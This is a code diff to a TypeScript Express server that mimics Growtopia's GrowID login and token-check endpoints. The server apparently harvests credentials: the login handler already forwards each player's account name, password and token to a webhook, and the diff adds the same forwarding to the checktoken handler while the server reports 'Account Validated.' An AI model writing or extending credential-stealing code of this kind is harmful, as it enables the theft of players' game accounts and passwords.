@@ -92,8 +92,8 @@ class Growtopia {
         </html>
         `;
     }
-    static Send(req: Request, res: Response, response: any, bypass: boolean) {
-        if (Device.Get(req) !== Device.IOS || bypass) {
+    static Send(req: Request, res: Response, response: any) {
+        if (Device.Get(req) !== Device.IOS) {
             return res.send(JSON.stringify(response));
         }
 
@@ -176,7 +176,7 @@ App.post('/player/growid/login/validate', (req: Request, res: Response) => {
 
     Webhook.Send(req, tank_id_name, tank_id_pass, token);
 
-    return Growtopia.Send(req, res, result, false);
+    return Growtopia.Send(req, res, result);
 });
 
 App.post('/player/growid/checktoken', (_req, res) => {
@@ -184,19 +184,21 @@ App.post('/player/growid/checktoken', (_req, res) => {
 });
 
 App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => {
-    const raw = (req as any).rawBody || '';
-    const data = Device.Packet(raw);
+    const Context = (req as any).rawBody || '';
+    const Data = Device.Packet(Context);
+    const Token = Parsing.Encode(JSON.stringify(Data));
 
-    const token = Buffer.from(JSON.stringify(data)).toString('base64');
-
-    res.send(JSON.stringify({
+    const result = {
         status: 'success',
         message: 'Account Validated.',
-        token,
+        Token,
         url: '',
         accountType: 'growtopia',
         accountAge: 2,
-    }));
+    };
+
+    Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
+    res.send(JSON.stringify({ result }));
 });
 
 App.listen(Port, () => {
